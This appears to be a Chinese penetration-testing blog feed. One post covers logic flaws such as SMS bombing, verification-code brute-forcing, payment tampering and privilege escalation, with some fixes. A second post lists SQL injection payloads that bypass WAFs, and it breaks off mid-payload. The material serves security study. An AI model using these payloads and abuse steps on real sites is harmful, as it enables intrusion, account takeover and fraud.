title="短信轰炸"></a>短信轰炸</h2><p><strong>实现</strong>：通过数据包重放实现。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><h2 id="其他逻辑漏洞"><a href="#其他逻辑漏洞" class="headerlink" title="其他逻辑漏洞"></a>其他逻辑漏洞</h2><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p><strong>概念</strong>：可以通过同时<u>重放大量数据包</u>进行漏洞利用，通常用于突破限量、限额的问题都有奇效。</p><p><strong>原理</strong>：由于目标函数中，判断与数据修复两个步骤之间，或者两个数据修改步骤之间存在时间差，且函数未进行同步锁定，则可以造成漏洞。</p><p><strong>漏洞点</strong>：程序中存在限制，可以猜测到后台有判断与修改操作的方法</p><p><strong>修复</strong>：使用synchronized关键字，可以限制同一时间内访问方法的只有单一线程</p><p>并不是每个条件竞争都必须修复。</p><h3 id="数据包重放漏洞"><a href="#数据包重放漏洞" class="headerlink" title="数据包重放漏洞"></a>数据包重放漏洞</h3><p><strong>概念</strong>：通过数据包重放，可以造成短信轰炸、邮件轰炸、重复提交订单等。</p><p><strong>原理</strong>：后台未进行相关操作的计数导致数据包重放。</p><p><strong>漏洞点</strong>：短信验证码、邮件校验、提交订单等功能。</p><p><strong>修复</strong>：（针对短信、邮件）</p><p>构造一个Hashmap&lt;String，short&gt;，存放邮箱或电话号码及对应次数，只要某个邮箱或者电话号码次数够了，就不能继续发送了；或者计算两次发送的时间间隔，时间过短就不继续发送了</p><p><strong>通用修复方案</strong>：</p><p>需要建立<strong>token</strong>机制或验证码机制，一次有效。</p><h3 id="参数绑定漏洞"><a href="#参数绑定漏洞" class="headerlink" title="参数绑定漏洞"></a>参数绑定漏洞</h3><p><strong>概念</strong>：通过添加对象字段相关参数进行数据篡改</p><p><strong>原理</strong>：对象自动绑定被许多框架支持，它允许将HTTP请求参数自动的绑定到对象，开发者没有对其进行安全校验则容易导致数据篡改。</p><p><strong>漏洞点</strong>：常见的所有输入的地方都会出现这个漏洞，特别是金融、用户、缓存等。</p><p><strong>修复</strong>：Spring MVC中可以使用@InitBinder注释，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="举例（出现位置）"><a href="#举例（出现位置）" class="headerlink" title="举例（出现位置）"></a>举例（出现位置）</h2><p><strong>逻辑漏洞的问题可以分为前端和后端两个部分，总体思路都是先测试前端再测试后端。</strong></p><h3 id="注册处"><a href="#注册处" class="headerlink" title="注册处"></a>注册处</h3><p>注册功能可能出现任意用户注册、短信轰炸等问题。</p><p>以手机注册为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821141424493.png" alt="image-20220821141424493"></p><h4 id="前端参数验证的漏洞"><a href="#前端参数验证的漏洞" class="headerlink" title="前端参数验证的漏洞"></a>前端参数验证的漏洞</h4><p>注册时BP抓包，查看每个返回包有没有返回手机验证码或者存在true、false之类的判断语句，尝试将false修改为true，成功注册的话就绕过了前端验证。</p><p>拦截返回的响应包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145657006.png" alt="image-20220821145657006"></p><h4 id="任意用户添加"><a href="#任意用户添加" class="headerlink" title="任意用户添加"></a>任意用户添加</h4><p>在未登录或者低权限的的情况下，利用数据包添加任意用户。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220912152818701.png" alt="image-20220912152818701"></p><h4 id="短信轰炸漏洞"><a href="#短信轰炸漏洞" class="headerlink" title="短信轰炸漏洞"></a>短信轰炸漏洞</h4><p>尝试重放发送验证码的包，查看手机是否在短时间内收到了多条短信，是的话则存在短信轰炸漏洞，这是因为后端没有对发送手机短信做时间限制。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821145912458.png" alt="image-20220821145912458"></p><h4 id="修改发送包手机号"><a href="#修改发送包手机号" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>首先用自己的手机收到正确验证码，在点击注册时拦截包将手机号改为其他手机号，如果成功的话就注册了别人的手机号，这是因为后端仅验证了验证码是否是正确的而没有验证验证码是否与手机匹配。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821150032637.png" alt="image-20220821150032637"></p><h3 id="登陆处"><a href="#登陆处" class="headerlink" title="登陆处"></a>登陆处</h3><p>登录处可能出现任意用户登录、验证码可绕过、用户账号可撞库等问题。</p><p>以手机验证码登录举例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160800742.png" alt="image-20220821160800742"></p><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><p>对比正确登录和错误登录的包，对比返回包看是否有判断，尝试修改参数绕过前端验证。</p><h4 id="修改cookie实现垂直越权"><a href="#修改cookie实现垂直越权" class="headerlink" title="修改cookie实现垂直越权"></a>修改cookie实现垂直越权</h4><p>cookie的构造过于简单，可以分析出一部分参数，且通过前端JS文件可以判断出对该参数的校验。</p><p>比如发现前端文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params"></span>) <span class="comment">//login_ok.htm use</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;login=1&quot;</span>;</span><br><span class="line"><span class="title function_">MM_goToURL</span>(<span class="string">&#x27;parent&#x27;</span>, <span class="string">&#x27;home.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么将Cookie中的 login&#x3D;1 则会以管理员身份跳转 home.html，成功绕过登录。</p><h4 id="短信轰炸-1"><a href="#短信轰炸-1" class="headerlink" title="短信轰炸"></a>短信轰炸</h4><p>与注册处测试步骤一样</p><h4 id="验证码爆破-1"><a href="#验证码爆破-1" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>包括图片验证码和手机验证码。</p><p>先测试图片验证码，将使用正确验证码登录的包再重放一次，如果回显还是正确登录的话说明并没有对图片验证码进行限制，可以尝试撞库。</p><p>至于手机验证码，通常是尝试爆破，如果网站发到手机上的短信没有写什么在xx时间内有效之类的则有可能没有时间限制，将登录包右键发送至Intruder（即测试器模块）设置好爆破位置后在载荷里选择数值后这样填写。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162352786.png" alt="image-20220821162352786"></p><p>通常范围是填写正确验证码所在的范围，爆破出来后就可以登录用户，对应着任意用户登录漏洞。</p><h4 id="修改发送包手机号-1"><a href="#修改发送包手机号-1" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>修改发送包手机号则和上面注册处修改发送包手机号步骤一样，不同的是上面注册处是为了测试任意用户注册，而这里登录处是为了测试任意用户登录，原理一样目的不同。</p><h4 id="修改用户参数"><a href="#修改用户参数" class="headerlink" title="修改用户参数"></a>修改用户参数</h4><p>查看正确登录包的返回包是否有用户id之类的参数，尝试修改该参数。（不嫌麻烦的话可以用两个正确登录的返回包对比）</p><p>拦截该请求的返回包修改返回包中的用户参数。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821162530220.png" alt="image-20220821162530220"></p><h3 id="密码找回处"><a href="#密码找回处" class="headerlink" title="密码找回处"></a>密码找回处</h3><p>密码找回处可能出现任意用户密码找回、验证码可绕过等问题。</p><p>以手机验证码找回为例：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821160553407.png" alt="image-20220821160553407"></p><h4 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h4><p>同样是修改返回包看是否能跳过验证步骤。</p><h4 id="验证码爆破-2"><a href="#验证码爆破-2" class="headerlink" title="验证码爆破"></a>验证码爆破</h4><p>验证码爆破与上面登录处的验证码爆破操作一致。</p><h4 id="修改发送包手机号-2"><a href="#修改发送包手机号-2" class="headerlink" title="修改发送包手机号"></a>修改发送包手机号</h4><p>与上面注册处的修改发送包手机号操作一致</p><h2 id="支付与越权"><a href="#支付与越权" class="headerlink" title="支付与越权"></a>支付与越权</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220821163341791.png" alt="image-20220821163341791"></p><p>可以使用两个账号来对比测试，这样可以更快发现可疑参数。</p><p>支付接口指的是网站支付一般会有像微信支付、支付宝支付这种，一般网站会在支付的发送包里用某个参数标识。</p><p>登录时查看并测试用户信息返回接口指的是，在登录的时候，有的网站有个返回包是一个json数据包，该包内包含了用户敏感信息，此时就可以尝试修改发送包的用户参数，说不定就能获取其他用户的敏感信息。 </p><h2 id="权限框架缺陷"><a href="#权限框架缺陷" class="headerlink" title="权限框架缺陷"></a>权限框架缺陷</h2><p>权限控制框架是实现权限控制功能的基础（例如shiro），如果权限控制框架本身存在缺陷，那么就会导致权限控制功能完全失效。</p><h2 id="SRC中逻辑漏洞总结"><a href="#SRC中逻辑漏洞总结" class="headerlink" title="SRC中逻辑漏洞总结"></a>SRC中逻辑漏洞总结</h2><ol><li><p>注册：</p><ol><li>短信轰炸</li><li>验证码安全问题</li><li>密码爆破</li><li>邮箱轰炸</li></ol></li><li><p>用户任意注册、批量注册</p></li><li><p>用户名枚举</p></li><li><p>XSS（有框的地方就可以尝试插XSS）</p></li><li><p>登录：</p><ol><li>短信轰炸、验证码安全问题、密码爆破、邮箱轰炸</li><li>SQL注入</li><li>撞库</li><li>抓包把password字段修改为空值发送</li><li>认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号</li><li>Cookie仿冒</li><li>修改返回包的相关数据，可能会登陆到其他的用户</li></ol></li><li><p>找回密码：</p><ol><li>短信邮箱轰炸、短信邮箱劫持</li><li>重置任意用户账户密码、验证码手机用户未统一验证</li><li>直接跳过验证步骤</li></ol></li><li><p>购买支付、充值（要利用抓包去仔细查看每一个可用的参数）</p><ol><li>交易金额、数量修改、更换支付模块（比如更换支付的模块金额）</li><li>交易信息订单编码&#x2F;导致信息泄露</li><li>整数溢出，int最大值为2147483647，超过最大值</li><li>修改充值账户</li><li>支付绕过</li></ol></li><li><p>抽奖活动</p><ol><li>刷奖品、积分</li><li>并发</li></ol></li><li><p>优惠卷、代金卷</p><ol><li>并发逻辑漏洞（burp批量获取优惠券）</li><li>修改优惠券金额、数量</li></ol></li><li><p>订单信息</p><ol><li>订单信息遍历、泄露</li><li>订单信息泄露导致用户信息泄露</li><li>删出他人订单</li></ol></li><li><p>会员系统</p><ol><li>修改个人信息上传文件，上传带弹窗的html</li><li>如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测</li><li>图片上传也可能遇到imagereagick命令执行，上传恶意图片</li><li>视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf</li><li>用户横向越权访问、遍历、导致用户信息泄露</li><li>SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS</li></ol></li><li><p>传输过程</p></li><li><p>明文传输账户密码</p></li><li><p>修改信息处无session&#x2F;token导致csrf</p></li><li><p>POST&#x2F;COOKIE注入</p></li><li><p>评论</p></li><li><p>POST注入</p></li><li><p>存储型XSS</p></li><li><p>无session&#x2F;token导致CSRF</p></li><li><p><strong>验证码问题</strong></p><ol><li>万能验证码</li><li>返回包中存在验证码</li><li>删除验证码或者cookie中的值可以爆破账号密码</li></ol></li><li><p><strong>短信轰炸</strong></p><ol><li>一直重放</li><li>删除修改cookie，重放数据包</li><li>遍历参数发送数据包</li><li>手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包</li><li>请求参数修改大小写，或者添加请求参数比如&amp;id&#x3D;1</li><li>一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口</li><li>如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显</li></ol></li><li><p><strong>水平越权</strong></p><ol><li>主要登陆后还是修改参数，主要找到多个接口不断测试</li><li>关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测</li><li>多个账号，主要分析请求参数</li></ol></li><li><p><strong>数据泄露</strong></p><p>在找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回</p></li><li><p><strong>任意用户密码重置</strong></p><ol><li>目前大部分都是在修改密码处参数修改</li><li>有些是前端验证</li></ol></li></ol><p><strong>支付逻辑漏洞</strong></p><ol><li>边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户</li><li>顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。</li><li>金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包</li><li>确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。</li><li>请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。</li><li>请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。</li><li>订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。</li><li>欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家</li><li>单位替换：产生在paypal类似的国际支付的场景。</li><li>用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西</li><li>强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。</li><li>秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。</li><li>函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。</li><li>heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。</li></ol><p>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。</p><ol><li><p><strong>修改返回包的越权</strong></p><ol><li>修改手机号</li></ol><p>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改</p><p>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过</p><p>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞</p></li><li><p><strong>登录绕过</strong></p><p>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号</p></li><li><p><strong>水平越权</strong></p><ol><li><p>遍历ID</p><p>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题</p></li><li><p>ID替换</p><p>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题</p></li><li><p>垂直越权</p><p>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</p></li></ol></li></ol><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>采用成熟的权限管理框架（如spring security）</p><p><strong>验证用户是否具有操作数据的权限</strong></p><p>用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）<strong>优先采用在服务端关联session或加密后放在session中的方式获取</strong></p><p>应对用户凭证（如用户ID、产品号码、订单流水号等）采用难以猜测的构造方式（如随机数）或采用复杂的加密算法加密后再提交</p><p><strong>对管理功能模块进行严格的权限验证</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞&quot;&gt;&lt;a href=&quot;#逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞&quot;&gt;&lt;/a&gt;逻辑漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.freebuf.com/vuls/281141.html&quot;&gt;https://</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-WAF绕过</title>
    <link href="https://frankcao3.github.io/posts/24600"/>
    <id>https://frankcao3.github.io/posts/24600</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:24.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WAF简介"><a href="#WAF简介" class="headerlink" title="WAF简介"></a>WAF简介</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>WAF(Web Application Firewall)的具有以下四个方面的功能：</p><ul><li><p><strong>会话审计</strong></p><p>用来截获所有HTTP数据或者仅仅满足某些规则的会话</p></li><li><p><strong>访问控制</strong></p><p>用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p></li><li><p><strong>架构&#x2F;网络设计</strong></p><p>当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p></li><li><p><strong>WEB应用加固</strong></p><p>这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p></li></ul><p><strong>常用功能包括：</strong></p><p>1.网马木马主动防御及查杀</p><p>2.流量监控</p><p>3.网站漏洞防御</p><p>4.危险组件防御</p><p>5..Net安全保护模块</p><p>6.双层防盗链链接模式</p><p>7.网站特定资源防下载</p><p>8.CC攻击防护</p><p>9.网站流量保护</p><p>10.IP黑白名单</p><h3 id="WAF防护手段"><a href="#WAF防护手段" class="headerlink" title="WAF防护手段"></a>WAF防护手段</h3><p><strong>异常检测机制</strong>：拒绝不符合HTTP标准的请求</p><p><strong>增强的输入验证</strong>：代理和服务端的验证，而不只是限于客户端验证</p><p><strong>白名单&amp;黑名单</strong>：白名单适用于稳定的We应用，黑名单适合处理已知问题</p><p><strong>基于规则和基于异常的保护</strong>：基于规则更多的依赖黑名单机制，基于异常更为灵活</p><p><strong>状态管理</strong>：重点进行会话保护</p><p><strong>信息泄露保护</strong>：防止服务器信息泄露。</p><p>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p><p>如果是对于扫描器，WAF有其识别之道：</p><p><strong>扫描器识别主要由以下几点：</strong></p><ol><li>扫描器指纹(head字段&#x2F;请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识 </li><li>单IP+ cookie某时间段内触发规则次数 </li><li>隐藏的链接标签等() </li><li>Cookie植入 </li><li>验证码验证，扫描器无法自动填充验证码 </li><li>单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</li></ol><h3 id="常见WAF产品"><a href="#常见WAF产品" class="headerlink" title="常见WAF产品"></a>常见WAF产品</h3><ul><li><p><strong>硬件WAF</strong></p><p>如果是串联到链路中，则可以拦截恶意流量，如果是以旁路的形式部署，则只能记录攻击但是不能拦截。硬件型WAF一般而言比软件型WAF更加昂贵，但是检测速度快，不易称为网站瓶颈。</p><p>如绿盟、启明、安恒、创宇、神州数码</p></li><li><p><strong>软件WAF</strong></p><p>安全狗、D盾、云锁、中间件自带的waf</p></li><li><p><strong>云WAF</strong></p><p>阿里云、安全狗、创宇、安恒等</p></li></ul><h2 id="WAF防护绕过"><a href="#WAF防护绕过" class="headerlink" title="WAF防护绕过"></a>WAF防护绕过</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727205214531.png" alt="image-20220727205214531"></p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>在语句中添加某些特殊符号，并不会影响语句的执行效果。在waf绕过中，检测这些特殊符号干扰了检测机制，从而绕过检测。 </p><h4 id="通过注释符号-x2F-x2F-进行绕过"><a href="#通过注释符号-x2F-x2F-进行绕过" class="headerlink" title="通过注释符号&#x2F;**&#x2F;进行绕过"></a>通过注释符号&#x2F;**&#x2F;进行绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select database/**/();</span><br><span class="line">+-------------+</span><br><span class="line">| database () |</span><br><span class="line">+-------------+</span><br><span class="line">| security    |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="通过-0A为换行符；-23为-号；-20为空格实现绕过"><a href="#通过-0A为换行符；-23为-号；-20为空格实现绕过" class="headerlink" title="通过%0A为换行符；%23为#号；%20为空格实现绕过"></a>通过%0A为换行符；%23为#号；%20为空格实现绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=-1 /*%0a*/union/*%0a*/select/*%0a*/1,2,3</span><br><span class="line">相当于</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">1,2,3</span><br><span class="line"></span><br><span class="line">select * from users where id=-1 union%23a%0Aselect 1,2,3%23   // select a union的组合可以将安全狗屏蔽掉</span><br><span class="line">相当于</span><br><span class="line">union #a</span><br><span class="line"></span><br><span class="line">select 1,2,3#</span><br></pre></td></tr></table></figure><h4 id="内联注释绕过-原理"><a href="#内联注释绕过-原理" class="headerlink" title="内联注释绕过/*!*/原理"></a>内联注释绕过<code>/*!*/</code>原理</h4><p><code>/*!*/</code>符号内语句不会注释，可以正常的执行。</p><p><code>/*!select * from users*/</code>的结果如下：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/973eec3ae8780068054370c04685751813422942.png@527w_419h_progressive.webp" alt="img"></p><ul><li><p><code>/** #*/</code>原理</p><p>比如<code>id=1/**&amp;id=-1 union select 1,2,3#*/</code></p><p>安全狗检测到的：<code>id=1</code>，以为<code>/***/</code>里面是注释不执行</p><p>但是Apache检测到的：<code>-1 union select 1,2,3#*/</code> 会以后一个id值为准</p></li></ul><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><h4 id="大小写-x2F-关键字替换"><a href="#大小写-x2F-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1 UnIoN/**/SeLeCT 1,user()</span><br><span class="line">Hex() bin() 等价于ascii()</span><br><span class="line">Sleep() 等价于 benchmark()</span><br><span class="line">Mid()substring() 等价于 substr()</span><br><span class="line">@@user 等价于 User()</span><br><span class="line">@@Version 等价于 version()</span><br></pre></td></tr></table></figure><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><p>hex,urlcode,base64等</p><p>比如关键字全部被拦截，那么尝试使用URL全编码的方式绕过拦截。由于服务器会自动对URL进行一次URL解码， 所以需要把关键词编码两次，这里需要注意的地方是，URL编码需选择全编码，而不是普通的URL编码。</p><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>GET POST COOKIE等</p><p>POST-&gt;multipart&#x2F;form-data</p><h4 id="中间件HPP参数污染"><a href="#中间件HPP参数污染" class="headerlink" title="中间件HPP参数污染"></a>中间件HPP参数污染</h4><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><p><strong>参数污染源原理</strong></p><p>在HTTP协议中允许同样名称的参数出现多次，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。</p><p>假设这个URL：<code>http://www.xxxx.com/search.php?id=110&amp;id=911</code>，主要有三种情况。</p><p>百度会理解成让百度搜索: 110           # 选择了第一一个参数,放弃了第二个参数。</p><p>雅虎会理解成让雅虎搜索: 911           # 选择了第二个参数,放弃了第一个参数。</p><p>谷歌会理解成让谷歌搜索: 110 911   # 两个参数同时选择。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/20210608112521171.png" alt="img"></p><h3 id="数据库特性"><a href="#数据库特性" class="headerlink" title="数据库特性"></a>数据库特性</h3><h4 id="Mysql技巧"><a href="#Mysql技巧" class="headerlink" title="Mysql技巧"></a>Mysql技巧</h4><p>（1）mysql注释符有三种：#、&#x2F;<em>…</em>&#x2F;、–   (注意–后面有一个空格)</p><p>（2）空格符：[0x09, 0x0a-0x0d, 0x20, 0xa0]</p><p>（3）特殊符号：%a 换行符</p><p>  可结合注释符使用%23%0a，%2d%2d%0a。</p><p>（3）内联注释：</p><p>  <code>/*!UnIon12345SelEcT*/ 1,user()</code>  </p><p>  &#x2F;&#x2F;数字范围 1000-50540</p><p>（4）mysql黑魔法</p><p>  <code>select&#123;x username&#125;from&#123;x11 test.admin&#125;;</code></p><h4 id="SQL-Server技巧"><a href="#SQL-Server技巧" class="headerlink" title="SQL Server技巧"></a>SQL Server技巧</h4><p>（1）用来注释掉注射后查询的其余部分：</p><p>  &#x2F;*    C语言风格注释</p><p>  –    SQL注释</p><p>  ; 00％ 空字节</p><p>（2）空白符：[0x01-0x20]</p><p>（3）特殊符号：%3a 冒号</p><p>   id&#x3D;1 union:select 1,2 from:admin</p><p>（4）函数变形：如<code>db_name[空白字符]()</code></p><h4 id="Oracle技巧"><a href="#Oracle技巧" class="headerlink" title="Oracle技巧"></a>Oracle技巧</h4><p>（1）注释符：–、&#x2F;**&#x2F;</p><p>（2）空白字符：[0x00, 0x09, 0x0a-0x0d, 0x20]</p><h4 id="配合FUZZ"><a href="#配合FUZZ" class="headerlink" title="配合FUZZ"></a>配合FUZZ</h4><p>select * from admin where id&#x3D;1【位置一】union【位置二】</p><p>select【位置三】1,2,db_name()【位置四】from【位置五】admin</p><h3 id="逻辑层"><a href="#逻辑层" class="headerlink" title="逻辑层"></a>逻辑层</h3><h4 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h4><p>（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p><p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</p><p>（3）HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</p><p>（4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。</p><p>比如：<code>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</code></p><h4 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h4><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p>例子1：</p><p>?id&#x3D;1 and (select 1)&#x3D;(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><p>PS：0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</p><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1 union select 1,schema_name,3 from 